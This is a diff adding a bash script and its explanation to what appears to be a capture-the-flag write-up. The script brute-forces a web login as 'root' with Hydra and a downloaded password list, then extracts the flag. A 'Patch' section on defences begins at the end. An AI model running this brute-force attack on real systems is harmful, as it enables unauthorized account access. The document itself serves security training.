@@ -108,6 +108,47 @@ if __name__ == "__main__":
 
 It first checks if the provided IP address is reachable by sending a `GET` request. It then downloads a list of common passwords from a specified URL and iterates through each password, attempting to log in with the username `root`. For each password, it constructs a `curl` command to attempt a login on the target site, and pipes the result to `grep` to check if the word "flag" appears in the response, indicating a successful login. If the word "flag" is found, the script prints the valid username, password, and the extracted flag, then stops. If no valid password is found after testing all options, it prints a failure message.
 
+**script.sh**
+
+```bash
+#!/bin/bash
+
+if [ "$#" -ne 1 ]; then
+	echo "Usage: ./script.sh <ip>"
+	exit 1
+fi
+
+ip=$1
+
+function exec_hydra {
+	curl -o dictionary https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+	output=$(hydra -l root -P dictionary -F -V "$ip" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif')
+	password=$(echo "$output" | grep -oP 'password: \K\S+')
+	rm dictionary
+}
+
+if command -v hydra &> /dev/null; then
+	echo "Hydra is installed."
+	exec_hydra
+else
+	echo "Hydra is not installed."
+	echo "Installation..."
+	git clone https://github.com/vanhauser-thc/thc-hydra.git
+	cd thc-hydra
+	./configure --prefix=$HOME/.local
+	make
+	make install
+	export PATH=$HOME/.local/bin:$PATH
+	source ~/.bashrc
+	source ~/.zshrc
+	exec_hydra
+fi
+
+curl "http://$ip/index.php?page=signin&username=root&password=$password&Login=Login#" | grep flag | awk -F': | <' '{print "\nThe flag is: "$2}'
+```
+
+It first checks if the provided IP address argument is supplied. If not, it prints a usage message and exits. The script then verifies if Hydra is installed by checking for the `hydra` command. If Hydra is found, it downloads a common password dictionary using `curl`, runs Hydra with the password list to brute-force the login page (/index.php), and extracts the password found from the Hydra output using `grep`. The password is stored in a variable, and the dictionary file is deleted afterward. If Hydra is not installed, the script clones the Hydra repository from GitHub, compiles, installs it locally, and sets the necessary environment variables before running Hydra. Finally, the script sends a `curl` request with the found password to the login page and extracts the flag from the response using `grep` and `awk`, printing the flag if found.
+
 ## 🔧 Patch
 
 Many defensive measures can be taken, but here are the main ones:
